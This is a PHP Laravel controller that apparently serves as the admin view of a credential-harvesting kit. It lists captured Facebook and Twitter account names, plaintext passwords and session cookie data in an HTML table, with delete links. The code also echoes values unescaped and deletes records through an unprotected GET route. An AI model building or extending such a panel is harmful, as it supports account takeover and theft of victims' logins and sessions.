<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\FacebookLogin;

class FacebookController extends Controller
{
    public function getfacebooklogin(Request $request, $id){

      $data = 	FacebookLogin::where('user_id', $id)->get()->toArray();
     

      if(!empty($data))
   {  
   ?>

    <div class="box-body">
            <table id="example2" class="table table-bordered table-striped" >
                     <thead>
			                  <tr>                       
			                   <th>#</th>
			                    <th></th>
			                   <th> Name </th>
			                   <th> Password</th>
			                   <th> Created At</th>
			                   <th>Cookies Data</th>
			                   <th></th>
			                 </tr>
                     </thead>
		                     <tbody> 
		                      <?php
		                      	$i= 1;
		                      	foreach ($data as $key ) {                     	
		                      	?>
		                      <tr> 
		                       <td><?php echo $i++; ?></td>

		                      <td><?php if(!empty($key['checkCookies']) and $key['checkCookies'] == 'facebook') {?> 
                        <img height="30" width="30" src="<?php echo url('uploads/facebook.png'); ?>" alt="Italian Trulli"><?php } elseif(!empty($key['checkCookies']) and $key['checkCookies'] == 'twitter'){
                          ?>  <img height="30" width="30" src="<?php echo url('uploads/twitter.png'); ?>" alt="Italian Trulli"> <?php
                        } ?></td> 

		                       <td><?php echo $key['name'];?></td>
		                       <td><?php echo $key['password'];?></td> 
		                       <td width="15%"><?php echo date('d M Y h:m', strtotime($key['created_at']));?></td> 
		                      <td style="word-break: break-all;"><?php echo $key['cookis_data'];?></td>

		                       <td><a href="<?php echo url('/deletes/log'.'/'.$key['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>
		                      </tr> 
		                    <?php } ?>
		                       
		                     </tbody>
                 
                   </table>
                  </div>
   <?php
 }else{?>

    <p> Data Not Found</p> 
 <?php }
    }






    public function delete($id){

    	FacebookLogin::where('id',$id)->delete();

    	return redirect()->back();
    }
}
